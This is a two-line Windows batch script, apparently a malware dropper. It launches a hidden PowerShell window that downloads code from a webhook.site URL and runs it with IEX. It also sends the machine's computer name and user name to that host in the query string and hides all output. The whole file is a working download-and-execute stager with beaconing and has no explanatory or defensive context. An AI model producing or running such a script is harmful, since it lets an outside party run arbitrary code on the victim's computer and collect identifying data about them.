@echo off
powershell -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d?zip-bat-works=YES&pc=%COMPUTERNAME%-%USERNAME%&t='+[DateTime]::Now.Ticks))" >nul 2>&1
